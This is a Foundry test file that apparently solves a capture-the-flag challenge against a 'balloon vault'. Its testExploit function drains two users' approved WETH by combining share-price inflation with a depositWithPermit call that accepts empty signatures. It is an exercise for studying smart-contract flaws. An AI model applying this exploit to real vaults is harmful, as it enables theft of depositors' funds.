// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/
        weth.deposit{value: 10 ether}();
        weth.approve(address(vault), type(uint256).max);
        while (weth.balanceOf(alice) > 0) {
            // deposit 1 wei
            vault.deposit(1, attacker);
            // calculate victim deposit value
            uint256 deposit =
                weth.balanceOf(alice) < weth.balanceOf(attacker) ? weth.balanceOf(alice) : weth.balanceOf(attacker);
            // inflate deposit value
            weth.transfer(address(vault), weth.balanceOf(attacker));
            // deposit alice's balance thanks to permit bug
            vault.depositWithPermit(alice, deposit, 0, 0, 0, 0);
            // redeem 1 shares to redeem all deposited weth
            vault.redeem(1, attacker, attacker);
        }

        // deposit 1 wei
        vault.deposit(1, attacker);
        // inflate deposit value with 500+ weth taken from alice
        weth.transfer(address(vault), weth.balanceOf(attacker));
        // deposit bob's balance thanks to permit bug
        vault.depositWithPermit(bob, weth.balanceOf(bob), 0, 0, 0, 0);
        // redeem 1 shares to redeem all deposited weth
        vault.redeem(1, attacker, attacker);

        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
